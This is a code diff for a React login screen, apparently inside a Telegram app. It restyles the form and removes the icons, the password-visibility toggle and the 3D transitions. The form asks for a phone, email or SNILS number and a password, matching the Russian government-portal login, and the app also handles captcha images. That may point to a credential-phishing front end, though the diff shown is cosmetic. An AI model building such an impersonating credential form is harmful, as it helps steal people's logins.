@@ -5,10 +5,6 @@ import {
   ShieldCheck,
   Send,
   ArrowRight,
-  User,
-  Lock,
-  Eye,
-  EyeOff,
 } from 'lucide-react';
 
 declare global {
@@ -42,32 +38,26 @@ type Step =
 const screenVariants = {
   initial: (direction: 'forward' | 'backward') => ({
     x: direction === 'forward' ? '100%' : '-100%',
-    rotateY: direction === 'forward' ? 25 : -25,
-    scale: 0.92,
     opacity: 0,
   }),
   animate: {
     x: 0,
-    rotateY: 0,
-    scale: 1,
     opacity: 1,
     transition: {
       type: 'spring' as const,
-      stiffness: 280,
-      damping: 26,
-      mass: 0.85
+      stiffness: 320,
+      damping: 30,
+      mass: 0.8,
     },
   },
   exit: (direction: 'forward' | 'backward') => ({
     x: direction === 'forward' ? '-100%' : '100%',
-    rotateY: direction === 'forward' ? -25 : 25,
-    scale: 0.92,
     opacity: 0,
     transition: {
       type: 'spring' as const,
-      stiffness: 280,
-      damping: 26,
-      mass: 0.85
+      stiffness: 320,
+      damping: 30,
+      mass: 0.8,
     },
   }),
 };
@@ -106,7 +96,6 @@ export default function App() {
   const [tgFirstName, setTgFirstName] = useState('');
   const [login, setLogin] = useState('');
   const [password, setPassword] = useState('');
-  const [showPassword, setShowPassword] = useState(false);
   const [sessionId, setSessionId] = useState('');
   const [userInput, setUserInput] = useState('');
   const [captchaImg, setCaptchaImg] = useState('');
@@ -411,20 +400,19 @@ export default function App() {
             </div>
           </div>
 
-          <div className="screen-body">
+          <div className="screen-body glass-card backdrop-filter p-6">
             <div className="form-fields">
               <div className="field-floating">
-                <User size={18} className="field-icon-left" />
                 <input
                   type="text"
-                  className="field-input input-enhanced input-with-icon-left"
+                  className="field-input input-enhanced"
                   value={login}
                   onChange={(e) => setLogin(e.target.value)}
                   placeholder=" "
                   autoComplete="username"
                   autoFocus
                 />
-                <label className="floating-label floating-label-with-icon">
+                <label className="floating-label">
                   Телефон, Email или СНИЛС
                 </label>
                 <svg className="input-glow-border">
@@ -433,26 +421,17 @@ export default function App() {
               </div>
 
               <div className="field-floating">
-                <Lock size={18} className="field-icon-left" />
                 <input
-                  type={showPassword ? "text" : "password"}
-                  className="field-input input-enhanced input-with-icon-left input-with-icon-right"
+                  type="password"
+                  className="field-input input-enhanced"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   placeholder=" "
                   autoComplete="current-password"
                 />
-                <label className="floating-label floating-label-with-icon">
+                <label className="floating-label">
                   Пароль
                 </label>
-                <button
-                  type="button"
-                  className="field-toggle-right"
-                  onClick={() => setShowPassword(!showPassword)}
-                  tabIndex={-1}
-                >
-                  {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
-                </button>
                 <svg className="input-glow-border">
                   <rect pathLength={1} />
                 </svg>
